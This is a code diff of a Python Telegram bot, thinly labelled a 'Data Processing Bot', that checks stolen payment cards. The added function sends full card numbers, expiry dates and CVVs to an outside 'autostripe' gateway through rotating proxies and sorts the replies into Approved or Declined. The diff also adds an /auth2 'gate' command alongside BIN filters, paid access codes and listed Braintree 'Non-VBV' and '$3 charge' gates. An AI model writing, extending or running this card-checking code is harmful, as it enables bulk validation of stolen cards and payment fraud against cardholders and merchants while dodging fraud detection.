@@ -419,7 +419,48 @@ def format_proxy(proxy_str):
     return None
 
 
-def process_single_entry(entry, proxies_list, user_id):
+def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
+    """Auth2 gate — uses stripe.stormx.pw autostripe endpoint."""
+    start_time = time.time()
+    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
+    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc={cc_data}"
+
+    try:
+        resp = requests.get(url, timeout=35, proxies=proxies)
+        process_time = round(time.time() - start_time, 2)
+
+        if resp.status_code == 200:
+            resp_lower = resp.text.strip().lower()
+
+            approved_kw = [
+                'approved', 'success', 'charged', 'payment added', 'live', 'valid',
+                'succeeded', 'transaction approved', 'payment successful',
+                'authorization approved', 'ok', 'charge'
+            ]
+            declined_kw = [
+                'declined', 'failed', 'invalid', 'error', 'dead', 'decline',
+                'refused', 'blocked', 'insufficient', 'expired', 'incorrect'
+            ]
+
+            for kw in approved_kw:
+                if kw in resp_lower:
+                    return f"Approved | {resp.text.strip()} ({process_time}s)"
+
+            for kw in declined_kw:
+                if kw in resp_lower:
+                    return f"Declined | {resp.text.strip()} ({process_time}s)"
+
+            if len(resp.text.strip()) > 20:
+                return f"Approved | {resp.text.strip()} ({process_time}s)"
+            else:
+                return f"Declined | {resp.text.strip()} ({process_time}s)"
+        else:
+            return f"Declined | HTTP {resp.status_code} ({process_time}s)"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+def process_single_entry(entry, proxies_list, user_id, gate="auth"):
     raw_proxy = random.choice(proxies_list) if proxies_list else None
     proxy_dict = format_proxy(raw_proxy)
 
@@ -435,7 +476,10 @@ def process_single_entry(entry, proxies_list, user_id):
                 if not any(c_num.startswith(b) for b in user_bin_list):
                     return "SKIPPED | BIN not allowed"
 
-            result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
+            if gate == "auth2":
+                result = check_cc_auth2(c_num, c_mm, c_yy, c_cvv, proxy_dict)
+            else:
+                result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
         else:
             result = "Error: Invalid Format"
 
@@ -451,7 +495,7 @@ def process_single_entry(entry, proxies_list, user_id):
 DEFAULT_THREADS = 3
 
 
-def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS):
+def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
     # Load global proxies
     proxies_list = []
     if os.path.exists(PROXIES_FILE):
@@ -478,7 +522,7 @@ def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=D
         if not entry:
             return ("", "INVALID", "Empty line", "error")
 
-        result = process_single_entry(entry, proxies_list, user_id)
+        result = process_single_entry(entry, proxies_list, user_id, gate=gate)
 
         if "SKIPPED" in result:
             category = "skipped"
@@ -544,13 +588,13 @@ def fmt_start(is_adm=False):
     base = (
         "<b>Data Processing Bot</b>\n"
         f"{'─' * 28}\n\n"
-        "Upload a <b>.txt</b> file, then reply to it with <b>/auth</b>\n\n"
-        "<b>Commands:</b>\n"
-        "  /start      — Show this menu\n"
-        "  /redeem     — Unlock access\n"
-        "  /auth       — Stripe Auth\n"
+        "Upload a <b>.txt</b> file, then reply to it with a gate command\n\n"
+        "<b>Gates:</b>\n"
+        "  /auth       — Stripe Auth (Dilaboards)\n"
+        "  /auth2      — Stripe Auth (Stormx)\n"
         "  /nonvbv     — Braintree Non-VBV (coming soon)\n"
-        "  /charge     — Stripe Checkout $3 (coming soon)\n"
+        "  /charge     — Stripe Checkout $3 (coming soon)\n\n"
+        "<b>Commands:</b>\n"
         "  /bin        — Set BIN filter\n"
         "  /clearbin   — Clear BIN filter\n"
         "  /cancel     — Stop active task\n"
@@ -575,7 +619,7 @@ def fmt_start(is_adm=False):
     base += (
         "<b>How to use:</b>\n"
         "  1. Send a .txt file\n"
-        "  2. Reply to the file with /auth\n"
+        "  2. Reply to the file with /auth or /auth2\n"
         "  3. Wait for results\n"
         f"{FOOTER}"
     )
@@ -1113,15 +1157,18 @@ def handle_update(update):
         send_message(chat_id, f"<b>Access Granted</b>\n\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>\nWelcome aboard.{FOOTER}")
         return
 
-    # --- /auth (Stripe Auth) ---
-    if text == "/auth":
+    # --- /auth and /auth2 (gate commands) ---
+    if text in ("/auth", "/auth2"):
+        gate = "auth2" if text == "/auth2" else "auth"
+        gate_label = "Stripe Auth (Stormx)" if gate == "auth2" else "Stripe Auth (Dilaboards)"
+
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
             return
 
         reply = msg.get("reply_to_message")
         if not reply or not reply.get("document"):
-            send_message(chat_id, "<b>Reply to a .txt file with /auth</b>" + FOOTER)
+            send_message(chat_id, f"<b>Reply to a .txt file with {text}</b>" + FOOTER)
             return
 
         doc = reply["document"]
@@ -1162,12 +1209,12 @@ def handle_update(update):
 
         init_resp = send_message(
             chat_id,
-            "Starting Engine...",
+            f"Starting Engine — <b>{gate_label}</b>...",
             reply_markup=stop_button_markup(user_id)
         )
         progress_msg_id = init_resp.get("result", {}).get("message_id")
 
-        def _run():
+        def _run(gate=gate):
             start_time = time.time()
             last_edit_time = [0]
 
@@ -1236,7 +1283,7 @@ def handle_update(update):
                 with active_lock:
                     active_users.discard(user_id)
 
-            run_processing(lines, user_id, on_progress=on_progress, on_complete=on_complete)
+            run_processing(lines, user_id, on_progress=on_progress, on_complete=on_complete, gate=gate)
 
         t = threading.Thread(target=_run, daemon=True)
         t.start()
